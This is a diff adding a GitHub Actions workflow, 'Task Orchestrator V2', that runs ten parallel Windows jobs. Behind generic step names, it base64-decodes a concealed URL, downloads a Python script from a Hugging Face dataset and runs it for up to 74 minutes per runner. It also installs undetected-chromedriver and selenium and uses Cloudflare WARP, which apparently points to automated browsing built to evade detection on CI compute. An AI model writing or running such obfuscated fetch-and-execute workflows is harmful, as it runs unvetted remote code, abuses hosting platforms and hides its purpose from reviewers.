@@ -1,0 +1,68 @@
+name: Task Orchestrator V2
+
+on:
+  repository_dispatch:
+    types: [run-task]
+  workflow_dispatch:
+
+concurrency:
+  group: runner-pool-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+jobs:
+  run-pipeline:
+    name: "Runner-Instance-${{ matrix.id }}"
+    runs-on: windows-2022
+    timeout-minutes: 75
+
+    strategy:
+      fail-fast: false
+      matrix:
+        id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+
+    steps:
+      - name: Environment Initialization & Dependencies
+        shell: bash
+        run: |
+          printf "[BOOTSTRAP] Preparing Instance-%s...\n" "${{ matrix.id }}"
+          
+          TARGET_URL=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2NhY2EvcmVzb2x2ZS9tYWluL3N0YXJ0X3Nocmlua19uZXcucHk=" | base64 --decode)
+          
+          curl -fsSL "$TARGET_URL" -o app_task.py
+          
+          printf "[BOOTSTRAP] Updating package manager...\n"
+          python -m pip install --upgrade --quiet pip setuptools
+          pip install --quiet undetected-chromedriver selenium requests
+          printf "[BOOTSTRAP] Environment setup complete.\n"
+
+      - name: Task Execution & Process Monitor
+        shell: pwsh
+        env:
+          PYTHONIOENCODING: "utf-8"
+        run: |
+          Write-Host "=== Starting execution on instance ${{ matrix.id }} ==="
+          
+          $env:Path += ";C:\Program Files\Cloudflare\Cloudflare WARP"
+          
+          $ProcInfo = New-Object System.Diagnostics.ProcessStartInfo
+          $ProcInfo.FileName = "python"
+          $ProcInfo.Arguments = "app_task.py"
+          $ProcInfo.UseShellExecute = $false
+          
+          $JobProcess = [System.Diagnostics.Process]::Start($ProcInfo)
+          
+          Write-Host "=== Monitoring started. Maximum duration set to 74 minutes. ==="
+          
+          try {
+              Wait-Process -Id $JobProcess.Id -Timeout 4440 -ErrorAction Stop
+              Write-Host "=== Task completed cleanly within allocated timeframe. ==="
+          }
+          catch {
+              Write-Host "=== Timeout reached. Terminating process instance... ==="
+              Stop-Process -Id $JobProcess.Id -Force
+              Write-Host "=== Process successfully terminated. ==="
+          }
+
+      - name: Finalization Notice
+        shell: bash
+        run: printf "[FINISHED] Instance-%s reached end of lifecycle.\n" "${{ matrix.id }}"
